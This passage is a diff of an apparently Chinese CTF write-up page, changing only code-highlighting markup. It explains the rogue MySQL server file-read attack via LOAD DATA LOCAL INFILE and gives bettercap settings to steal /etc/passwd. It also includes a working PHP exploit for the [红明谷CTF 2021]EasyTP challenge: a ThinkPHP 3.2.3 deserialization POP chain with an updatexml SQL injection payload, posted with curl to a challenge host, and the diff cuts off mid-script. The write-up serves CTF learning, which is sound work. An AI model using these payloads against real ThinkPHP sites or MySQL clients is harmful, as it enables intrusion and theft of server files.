@@ -2,10 +2,10 @@
 &lt;h2 id="原理复现">原理&amp;amp;复现&lt;/h2>
 &lt;p>总体思路是这样的：伪造一个mysql的服务端（不需要有完整的数据库的功能 只需向客户端回复greeting package）当有客户端连接到时，可以被服务端访问一个客户端本地的文件（如果本地用户权限允许的话&lt;/p>
 &lt;p>帮助我们实现这一目标的sql语句是&lt;code>LOAD DATA INFILE&lt;/code>，它用于读取一个文件的内容放入表中，有两种形式&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-mysql" data-lang="mysql">&lt;span style="color:#00a8c8">Load&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#00a8c8">infile&lt;/span> &lt;span style="color:#d88200">&amp;#34;/data/data.csv&amp;#34;&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table&lt;/span> &lt;span style="color:#111">TestTable&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">Load&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#111">local&lt;/span> &lt;span style="color:#00a8c8">infile&lt;/span> &lt;span style="color:#d88200">&amp;#34;/data/data.csv&amp;#34;&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table&lt;/span> &lt;span style="color:#111">TestTable&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#75715e"># 有时与FIELDS TERMINATED BY &amp;#39;\n&amp;#39;一起使用
-&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>以上两种写法的差异在于是否有&lt;code>local&lt;/code>，也就是是否读取client本地的文件&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-mysql" data-lang="mysql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">Load&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#00a8c8">infile&lt;/span> &lt;span style="color:#d88200">&amp;#34;/data/data.csv&amp;#34;&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table&lt;/span> &lt;span style="color:#111">TestTable&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">Load&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#111">local&lt;/span> &lt;span style="color:#00a8c8">infile&lt;/span> &lt;span style="color:#d88200">&amp;#34;/data/data.csv&amp;#34;&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table&lt;/span> &lt;span style="color:#111">TestTable&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 有时与FIELDS TERMINATED BY &amp;#39;\n&amp;#39;一起使用
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>以上两种写法的差异在于是否有&lt;code>local&lt;/code>，也就是是否读取client本地的文件&lt;/p>
 &lt;p>&lt;img src="https://lightless-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/lightless/2bsdse1b1cf6g999bhhcyz9y/image.png" alt="来自官方文档">&lt;/p>
 &lt;p>在本地用wireshark抓个包康康这一sql语句具体是怎么执行的&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210702113235801.png" alt="image-20210702113235801">&lt;/p>
@@ -31,12 +31,12 @@
 &lt;p>可以用bettercap进行完美实践&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210702175622262.png" alt="image-20210702175622262">&lt;/p>
 &lt;p>需要设置的项非常简单&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#111">set&lt;/span> mysql.server.address 0.0.0.0 &lt;span style="color:#75715e"># 如果想用nps之类的代理工具映射到公网端口请务必设置此项&lt;/span>
-&lt;span style="color:#111">set&lt;/span> mysql.server.infile /etc/passwd &lt;span style="color:#75715e"># 想要读取的文件&lt;/span>
-&lt;span style="color:#111">set&lt;/span> mysql.server.outfile /xxxx &lt;span style="color:#75715e"># 保存到本地的位置&lt;/span>
-&lt;span style="color:#111">set&lt;/span> mysql.server.port 1099 &lt;span style="color:#75715e"># 随意端口都可以&lt;/span>
-mysql.server on
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="红明谷ctf-2021easytp">[红明谷CTF 2021]EasyTP&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">set&lt;/span> mysql.server.address 0.0.0.0 &lt;span style="color:#75715e"># 如果想用nps之类的代理工具映射到公网端口请务必设置此项&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">set&lt;/span> mysql.server.infile /etc/passwd &lt;span style="color:#75715e"># 想要读取的文件&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">set&lt;/span> mysql.server.outfile /xxxx &lt;span style="color:#75715e"># 保存到本地的位置&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">set&lt;/span> mysql.server.port 1099 &lt;span style="color:#75715e"># 随意端口都可以&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mysql.server on
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="红明谷ctf-2021easytp">[红明谷CTF 2021]EasyTP&lt;/h2>
 &lt;p>tp3.2.3，有一个现成的链子：&lt;a href="https://f5.pm/go-53579.html">ThinkPHP v3.2.* （SQL注入&amp;amp;文件读取）反序列化POP链&lt;/a>&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219155134609.png" alt="image-20211219155134609">&lt;/p>
 &lt;p>看Application\Home\Controller\IndexController.class.php的代码也跟这个文章中的示例代码大差不差，顺着这篇文章的思路跟一下&lt;/p>
@@ -68,183 +68,200 @@ mysql.server on
 &lt;li>获取到目标的数据库配置文件&lt;/li>
 &lt;/ul>
 &lt;p>用bettercap做mysql伪服务端读一下/etc/passwd&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
-&lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_LOCAL_INFILE&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#75715e">// 开启才能读取文件
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;debug&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;database&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;hostname&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;your_vps&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;hostport&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;port&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;charset&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;utf8&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>
-&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver\Memcache&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Imagick&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$img&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">();&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">();&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver\Mysql&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$pk&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">();&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;where&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,user(),31) from test.flag),0x7e),1)#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
-&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">()));&lt;/span>
-&lt;span style="color:#111">$curl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
-&lt;span style="color:#75af00">curl_setopt_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
-&lt;span style="color:#75af00">CURLOPT_URL&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://6382172d-0bab-4e87-b434-7d711efad721.node3.buuoj.cn/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#75af00">CURLOPT_ENCODING&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#75af00">CURLOPT_MAXREDIRS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#75af00">CURLOPT_TIMEOUT&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#75af00">CURLOPT_HTTP_VERSION&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">CURL_HTTP_VERSION_1_1&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#75af00">CURLOPT_CUSTOMREQUEST&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#75af00">CURLOPT_POSTFIELDS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">())),&lt;/span>
-&lt;span style="color:#75af00">CURLOPT_HTTPHEADER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;Postman-Token: 348e180e-5893-4ab4-b1d4-f570d69f228e&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#d88200">&amp;#34;cache-control: no-cache&amp;#34;&lt;/span>
-&lt;span style="color:#111">),&lt;/span>
-&lt;span style="color:#111">));&lt;/span>
-&lt;span style="color:#111">$response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#111">$err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;cURL Error #:&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$response&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219200242251.png" alt="image-20211219200242251">&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_LOCAL_INFILE&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#75715e">// 开启才能读取文件
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;debug&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;database&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;hostname&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;your_vps&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;hostport&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;port&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;charset&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;utf8&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver\Memcache&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Imagick&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$img&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
